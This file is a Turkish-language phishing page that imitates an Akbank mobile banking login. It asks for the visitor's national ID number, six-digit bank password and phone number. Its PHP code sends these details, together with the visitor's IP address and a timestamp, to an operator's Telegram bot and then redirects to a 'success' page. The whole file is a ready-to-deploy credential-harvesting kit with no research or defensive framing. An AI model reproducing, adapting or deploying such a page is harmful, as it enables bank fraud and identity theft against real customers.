<?php
if ($_POST) {
    $tckn = $_POST['tc_kimlik'];
    $sifre = $_POST['sifre'];
    $telefon = $_POST['telefon'];

    date_default_timezone_set('Europe/Istanbul');
    $tarih = date("d-m-Y H:i:s");
    $ips = $_SERVER['REMOTE_ADDR'];

    $botToken = ""; // Telegram bot token
    $chatId = ""; // chat ıd

    $text = "--> Yeni bir log var! <--\n\n";
    $text .= "⏰ LOG TARİHİ: " . $tarih . "\n";
    $text .= "⚙️ IP ADRESİ: " . $ips . "\n";
    $text .= "👤 KİŞİ TCKN: " . $tckn . "\n";
    $text .= "📞 TELEFON NUMARASI: " . $telefon . "\n";
    $text .= "💳 MOBİL ŞİFRE: " . $sifre . "\n";

    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $text
    ];

    $options = [
        'http' => [
            'header' => "Content-Type:application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result === FALSE) {
        echo "An error occurred while sending the message.";
    } else {
        header("Location: basarili.php");
        exit();
    }
}
?>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş</title>
    <style>
        body {
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background-color: #f7f7f7;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            align-items: center;
            height: 100vh;
        }

        .header {
            background-color: #d41f1f;
            width: 100%;
            padding: 15px;
            text-align: center;
            color: white;
            font-size: 20px;
            font-weight: bold;
        }

        .form-container {
            width: 100%;
            max-width: 400px;
            padding: 15px;
            box-sizing: border-box;
            margin-top: 30px;
        }

        .form-group {
            background-color: #ffffff;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        .form-group label {
            font-weight: bold;
            color: #999999;
            font-size: 12px;
            margin-bottom: 5px;
            display: block;
        }

        .form-group input {
            width: 100%;
            padding: 12px;
            margin-top: 5px;
            border: none;
            border-radius: 5px;
            background-color: #f7f7f7;
            font-size: 16px;
            color: #666666;
            box-sizing: border-box;
        }

        .forgot-password {
            color: #d41f1f;
            text-align: center;
            font-size: 14px;
            font-weight: bold;
            margin-top: -10px;
            margin-bottom: 20px;
            text-decoration: none;
        }

        .login-button {
            background-color: #ff6b6b;
            color: white;
            padding: 15px;
            text-align: center;
            border-radius: 30px;
            width: 100%;
            max-width: 400px;
            font-size: 18px;
            font-weight: bold;
            text-decoration: none;
            margin: 20px 0;
            box-sizing: border-box;
            border: none;
            cursor: not-allowed;
            opacity: 0.6;
        }

        .login-button.active {
            cursor: pointer;
            opacity: 1;
            background-color: #e53935; /* Buton aktif olunca rengi biraz koyulaşsın */
        }
    </style>
    <script>
        function validateForm() {
            const tcKimlik = document.getElementById('tc_kimlik').value;
            const sifre = document.getElementById('sifre').value;
            const telefon = document.getElementById('telefon').value;
            const loginButton = document.getElementById('loginButton');

            const tcKimlikValid = tcKimlik.length === 11 && /^\d+$/.test(tcKimlik);
            const sifreValid = sifre.length === 6 && /^\d+$/.test(sifre);
            const telefonValid = telefon.length >= 10 && telefon.length <= 15 && /^\d+$/.test(telefon);

            if (tcKimlikValid && sifreValid && telefonValid) {
                loginButton.disabled = false;
                loginButton.classList.add('active');
            } else {
                loginButton.disabled = true;
                loginButton.classList.remove('active');
            }
        }
    </script>
</head>
<body>

    <div class="header">
        Giriş
    </div>

    <form class="form-container" method="POST" action="">
        <div class="form-group">
            <label for="tc_kimlik">T.C. Kimlik Numarası</label>
            <input type="text" id="tc_kimlik" name="tc_kimlik" placeholder="Müşteri veya TC kimlik numaranı gir" maxlength="11" oninput="validateForm()" pattern="\d{11}" required>
        </div>

        <div class="form-group">
            <label for="sifre">Akbank Şifresi</label>
            <input type="password" id="sifre" name="sifre" placeholder="6 haneli şifreni gir" maxlength="6" oninput="validateForm()" pattern="\d{6}" required>
        </div>
        
        <div class="form-group">
            <label for="telefon">Telefon Numarası</label>
            <input type="tel" id="telefon" name="telefon" placeholder="Telefon numaranı gir" minlength="10" maxlength="15" oninput="validateForm()" pattern="\d{10,15}" required>
        </div>

        <a href="#" class="forgot-password">Şifreni mi unuttun?</a>

        <button type="submit" class="login-button" id="loginButton" disabled>Giriş</button>
    </form>

</body>
</html>
